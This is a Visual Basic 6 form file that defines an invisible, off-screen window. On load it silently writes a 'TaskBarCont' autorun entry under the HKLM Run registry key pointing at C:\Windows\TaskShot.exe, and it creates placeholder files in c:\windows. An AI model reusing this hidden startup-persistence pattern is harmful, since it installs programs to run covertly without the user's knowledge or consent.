VERSION 5.00
Begin VB.Form Form3 
   BorderStyle     =   0  'None
   ClientHeight    =   90
   ClientLeft      =   540
   ClientTop       =   -3030
   ClientWidth     =   90
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   615
      Left            =   1560
      TabIndex        =   0
      Top             =   480
      Visible         =   0   'False
      Width           =   1215
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
 Const HKEY_LOCAL_MACHINE = &H80000002
 Const SPIF_UPDATEINIFILE = &H1
Const SPI_SETDESKWALLPAPER = 20
Const SPIF_SENDWININICHANGE = &H2
Public Sub SaveString(hKey As Long, StrPath As String, StrValue As String, StrData As String)
   Dim KeyH&
    r = RegCreateKey(hKey, StrPath, KeyH&)
    r = RegSetValueEx(KeyH&, StrValue, 0, 1, ByVal StrData, Len(StrData))
    r = RegCloseKey(KeyH&)
End Sub



Private Sub Command1_Click()
On Error Resume Next
If Command1.Value = 1 Then
SaveSetting App.Title, App.Title, "RunWithSystem", 1
SaveString HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "TaskBarCont", "TaskBarCont"
Else
SaveSetting App.Title, App.Title, "RunWithSystem", 0
SaveString HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "TaskBarCont", "C:\Windows\TaskShot.exe"
End If
End Sub

Private Sub Form_Load()
On Error Resume Next
Command1_Click
FileNumber = FreeFile
filename = "c:\windows\1.txt"
Open filename For Append As #FileNumber
Close #FileNumber

FileNumber = FreeFile
filename = "c:\windows\vol.txt"
Open filename For Append As #FileNumber
Close #FileNumber


FileNumber = FreeFile
filename = "c:\windows\2.txt"
Open filename For Append As #FileNumber
Close #FileNumber



FileNumber = FreeFile
filename = "c:\windows\3.txt"
Open filename For Append As #FileNumber
Close #FileNumber

FileNumber = FreeFile
filename = "c:\windows\4.txt"
Open filename For Append As #FileNumber
Close #FileNumber

FileNumber = FreeFile
filename = "c:\windows\5.txt"
Open filename For Append As #FileNumber
Close #FileNumber


FileNumber = FreeFile
filename = "c:\windows\6.txt"
Open filename For Append As #FileNumber
Close #FileNumber


FileNumber = FreeFile
filename = "c:\windows\7.txt"
Open filename For Append As #FileNumber
Close #FileNumber


FileNumber = FreeFile
filename = "c:\windows\8.txt"
Open filename For Append As #FileNumber
Close #FileNumber


FileNumber = FreeFile
filename = "c:\windows\9.txt"
Open filename For Append As #FileNumber
Close #FileNumber


FrmMain.Show
End Sub
